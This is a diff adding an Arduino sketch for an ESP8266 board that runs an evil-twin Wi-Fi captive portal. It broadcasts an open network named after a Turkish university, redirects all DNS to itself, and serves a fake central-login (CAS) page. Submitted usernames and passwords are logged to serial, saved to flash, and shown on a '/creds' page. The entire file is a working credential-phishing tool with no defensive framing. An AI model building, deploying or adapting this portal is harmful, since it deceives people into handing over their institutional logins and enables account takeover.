@@ -1,0 +1,328 @@
+// ESP8266 WiFi Captive Portal
+// By 125K (github.com/125K)
+// LittleFS functionality by dsfifty 16 Nov 2022
+
+#include <ESP8266WiFi.h>
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
+#include <LittleFS.h>
+
+// User configuration
+#define SSID_NAME "ABC ÜNİVERSİTESİ"
+#define DNS_PORT 53
+#define HTTP_CODE 200
+#define TICK_TIMER 1000
+IPAddress APIP(172, 0, 0, 1);  // Gateway
+
+// Global variables for credentials storage and timers
+String credentialsData = "";
+bool savedData = false;
+unsigned long bootTime = 0, lastActivity = 0, lastTick = 0;
+int timer = 5000;
+int i = 0;
+
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+// Giriş sayfası (CAS Login tarzı) - Tamamen inline CSS ile
+const char* casLoginPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Merkezi Kimlik Doğrulama Servisi</title>
+  <style>
+    body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ecf0f5; margin: 0; padding: 0; }
+    .wrapper { width: 100%; }
+    .main-header {background: #800000; padding: 10px 0; color: #fff; text-align: center; }
+    .navbar-brand { font-size: 18px; font-weight: bold; color: #fff; text-decoration: none; }
+    .content-wrapper { margin: 30px auto; max-width: 400px; }
+    .login-box { background: #fff; padding: 20px; border: 1px solid #ddd; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .login-logo a { font-size: 22px; font-weight: bold; color: #4A4A4A; text-decoration: none; }
+    .login-box-body { margin-top: 20px; }
+    .login-box-msg { text-align: center; font-size: 16px; margin-bottom: 20px; }
+    .form-control { width: 100%; padding: 10px; border: 1px solid #ccc; margin-bottom: 15px; box-sizing: border-box; }
+    .btn { width: 100%; padding: 10px; background: #800000; border: none; color: #fff; font-size: 16px; cursor: pointer; }
+    .btn:hover { background: #c23321; }
+    .footer-links { text-align: center; margin-top: 15px; }
+    .footer-links a { color: #337ab7; text-decoration: none; margin: 0 5px; }
+    .footer-links a:hover { text-decoration: underline; }
+    .main-footer { background: #f7f7f7; padding: 10px 0; text-align: center; font-size: 12px; color: #777; margin-top: 30px; }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <header class="main-header">
+      <a href="https://abc.edu.tr" class="navbar-brand">
+        <!-- Logo Base64 olarak eklenebilir; örneğin: -->
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJ
+        bWFnZVJlYWR5ccllPAAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAB
+        51BMVEUAAAD///////////////////////////////////////////////////////////////+qqqr/
+        //////////////////////////////////////////////////////////////////////////
+        //////////////////////////////////////////////////////////////////////////
+        /////////////////////////////////////////////////////////////////+qqqr///9cXFx3d3f///+Pj48ODg7u7u7Nzc3d3d3////09PT9/f3o6Oj8/PzFxcXv7+/a2trz8/P7+/vv7+/h4eHY2Nj6+vrCwsLEyMjz8/Pz9/f3T09Pq6uqWlpb////Nzc3e3t7JyckzMzM2NjYzMzOampqioqJwcHDGxsY2NjZ2dnX19f5+fnAwMDAwMD///+cnJz///+bm5uLi4sTExPDw8Nvbm+fn5+vr6+/v7+4uLh0dHR8fHwwMDBsbGzU1NT09PTGxsa/v79sbGxERERxcXF/f3////+np6fz8/Ph4eGjo6O+vr6cnJyUlJSMjIxnZ2cZGRj29vb09PTT09PZ2dn////t7e3Pz8+QkJBCQkIyMjH///+hoaG8vLxvb2+2traioqJdXV3Ozs5KSkp1dXWe3t7o6Oj5+fn////MzMz8/Py6urqAgIC6urrCwsKXl5eRkZFubm7f39+Hh4eGhobf39/4+PjS0tLT09P////U1NTR0dHm5ub29vbu7u7///+9vb2/v79/f3+ysrK+vr7///+Ojo6YmJjU1NTk5OSVlZXQ0NDKysqioqJLS0tKSkoeHh5kZGROTk5ra2tpaWl7e3v19fVJSUnc3Nw4ODjR0dG6urpaWlqsrKySkpJ5eXnOzs5OTk6urq6ZmZnW1tbv7+/u7u7c3NzMzMzExMSTk5Ovr6/Nzc3Q0NBDQ0NHR0dLS0tXV1fV1dXo6OimpaWWlpb///+XWZiqAAAAX3RSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2uHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/QAAANZJREFUeNrs1NsSgjAMRHGVNmhKErRiyIou7/z/dwQxKBsmpQwPkn3OP7UskHqwhwmEsmkTQOS1Ep5dRfx0lmIimwlx9A0kgE9hh+YdShZJy+hiTAxe7Sz8RcCO5dK+CMqW50HwaEakUTBgwTE4lEnfGDls1KZc2W9wdWGGklzCQWZEH05xEkOTJMRjyQNqhcEyVCHa+ZCFaXRGs7FA6JMKpAWXaIV6pgQpxc/DbqOfE1tmv8DNR9XNz0ft9xAAAAAElFTkSuQmCC" style="vertical-align: middle;" alt="Logo">
+        ABC Üniversitesi
+      </a>
+    </header>
+    <div class="content-wrapper">
+      <div class="login-box">
+        <div class="login-logo">
+          <a href="#"><b>Merkezi Kimlik Doğrulama Servisi</b></a>
+        </div>
+        <div class="login-box-body">
+          <p class="login-box-msg">Kullanıcı Adı ve Parolanızı giriniz</p>
+          <form action="/post" method="post">
+            <div class="form-group">
+              <input type="text" id="username" name="username" class="form-control" placeholder="Kullanıcı Adı" required>
+            </div>
+            <div class="form-group">
+              <input type="password" id="password" name="password" class="form-control" placeholder="Parola" required>
+            </div>
+            <button type="submit" class="btn">GİRİŞ</button>
+          </form>
+          <div class="footer-links">
+            <a href="/creds">Kayıtlı Kimlik Bilgileri</a> | <a href="/clear">Temizle</a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <footer class="main-footer">
+      <div class="container">
+        <strong>Copyright &copy; 2016 
+          <a href="http://abc.edu.tr" style="color:#dd4b39;">ABC Üniversitesi</a>
+        </strong>
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
+)rawliteral";
+
+// Validating sayfası (form gönderimi sonrası gösterilecek ekran)
+const char* casValidatingPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Validating...</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #ecf0f5; margin: 0; padding: 0; }
+    .container { max-width: 400px; margin: 50px auto; background: #fff; border: 1px solid #ddd; 
+                 box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 20px; text-align: center; }
+    h1 { font-size: 22px; color: #333; margin-bottom: 15px; }
+    p { font-size: 16px; color: #555; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Validating...</h1>
+    <p>Kimlik bilgileriniz doğrulanıyor. Lütfen 5 dakikaya kadar bekleyin.</p>
+  </div>
+</body>
+</html>
+)rawliteral";
+
+// Temizlenmiş (clear) sayfası
+const char* casClearPage = R"rawliteral(
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Temizlendi</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #ecf0f5; margin: 0; padding: 0; }
+    .container { max-width: 400px; margin: 50px auto; background: #fff; border: 1px solid #ddd; 
+                 box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 20px; text-align: center; }
+    h1 { font-size: 22px; color: #333; margin-bottom: 15px; }
+    a { color: #dd4b39; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Kimlik Bilgileri Temizlendi</h1>
+    <p>Kayıtlı kimlik bilgileriniz silindi.</p>
+    <p><a href="/">Giriş Sayfasına Dön</a></p>
+  </div>
+</body>
+</html>
+)rawliteral";
+
+// Yardımcı fonksiyon: Giriş verilerini zararlı karakterlerden arındırır
+String sanitizeInput(String inputValue) {
+  inputValue.replace("<", "&lt;");
+  inputValue.replace(">", "&gt;");
+  return inputValue;
+}
+
+// LittleFS üzerinde kaydedilen veriyi okur
+void readData() {
+  File file = LittleFS.open("/SavedFile.txt", "r");
+  if (!file) return;
+  char buffer[1000];
+  int idx = 0;
+  while (file.available() && idx < sizeof(buffer) - 1) {
+    buffer[idx++] = file.read();
+  }
+  buffer[idx] = '\0';
+  file.close();
+  credentialsData = String(buffer);
+  if (credentialsData != "") savedData = true;
+}
+
+// Veriyi LittleFS'e yazar
+void writeData(String data) {
+  File file = LittleFS.open("/SavedFile.txt", "w");
+  if (file) {
+    file.print(data);
+    delay(1);
+    file.close();
+  }
+}
+
+// Dosyayı LittleFS üzerinden siler
+void deleteData() {
+  LittleFS.remove("/SavedFile.txt");
+}
+
+// Giriş (login) sayfasını döndürür
+String index() {
+  return String(casLoginPage);
+}
+
+// Form gönderimi sonrası; verileri okur, ekler, Serial'e yazdırır ve validasyon sayfasını döndürür
+String posted() {
+  String username = sanitizeInput(webServer.arg("username"));
+  String password = sanitizeInput(webServer.arg("password"));
+
+  // Seri monitöre yazdırma:
+  Serial.println("Yeni giriş yapıldı:");
+  Serial.println("Kullanıcı Adı: " + username);
+  Serial.println("Parola: " + password);
+
+  readData();  // Önceden kaydedilmiş veri varsa okur
+
+  // Yeni girilen bilgiyi ekliyoruz
+  credentialsData += "<li>Kullanıcı: <b>" + username + "</b><br>Parola: <b>" + password + "</b></li>";
+  writeData(credentialsData);
+  savedData = true;
+
+  return String(casValidatingPage);
+}
+
+// Kayıtlı kimlik bilgilerini görüntüleme sayfası
+String creds() {
+  String html = R"rawliteral(
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Saved Credentials</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #ecf0f5; margin: 0; padding: 0; }
+    .container { max-width: 400px; margin: 50px auto; background: #fff; border: 1px solid #ddd;
+                 box-shadow: 0 0 10px rgba(0,0,0,0.1); padding: 20px; }
+    h1 { text-align: center; font-size: 22px; color: #333; margin-bottom: 15px; }
+    ol { padding-left: 20px; }
+    a { color: #dd4b39; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Saved Credentials</h1>
+    <ol>)rawliteral";
+  html += credentialsData;
+  html += R"rawliteral(
+    </ol>
+    <div style="text-align: center;">
+      <p><a href="/">Giriş Sayfasına Dön</a></p>
+      <p><a href="/clear">Temizle</a></p>
+    </div>
+  </div>
+</body>
+</html>
+)rawliteral";
+  return html;
+}
+
+// Kimlik bilgilerini temizleme ve temizlenmiş sayfasını döndürür
+String clear() {
+  credentialsData = "";
+  savedData = false;
+  deleteData();
+  return String(casClearPage);
+}
+
+// LED blink işlemi; yeni veri alındığında geri bildirim sağlar
+void BLINK() {
+  for (int j = 0; j < 5; j++) {
+    digitalWrite(LED_BUILTIN, LOW);
+    delay(500);
+    digitalWrite(LED_BUILTIN, HIGH);
+    delay(500);
+  }
+}
+
+void setup() {
+  bootTime = lastActivity = millis();
+  Serial.begin(115200);
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, HIGH);
+
+  // LittleFS başlatma
+  if (!LittleFS.begin()) {
+    Serial.println("LittleFS mount failed");
+    delay(1000);
+    return;
+  }
+  // Her boot'ta kayıtlı veriyi okuyoruz
+  readData();
+
+  // WiFi AP modu ve captive portal ayarları
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(APIP, APIP, IPAddress(255,255,255,0));
+  WiFi.softAP(SSID_NAME);
+
+  // Tüm DNS isteklerini captive portal IP'sine yönlendirmek için DNS sunucusunu başlatıyoruz
+  dnsServer.start(DNS_PORT, "*", APIP);
+
+  // Web sunucusu rotaları
+  webServer.on("/post", [](){
+    webServer.send(HTTP_CODE, "text/html", posted());
+    BLINK();
+  });
+  webServer.on("/creds", [](){
+    webServer.send(HTTP_CODE, "text/html", creds());
+  });
+  webServer.on("/clear", [](){
+    webServer.send(HTTP_CODE, "text/html", clear());
+  });
+  webServer.onNotFound([](){
+    lastActivity = millis();
+    webServer.send(HTTP_CODE, "text/html", index());
+  });
+
+  webServer.begin();
+  Serial.println("Captive portal started.");
+}
+
+void loop() {
+  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  i++;
+  Serial.println(i);
+  Serial.println(savedData);
+  if (i == timer && savedData == true) {
+    i = 0;
+    digitalWrite(LED_BUILTIN, LOW);
+    delay(50);
+    digitalWrite(LED_BUILTIN, HIGH);
+  }
+  if (i > timer) { i = 0; }
+}
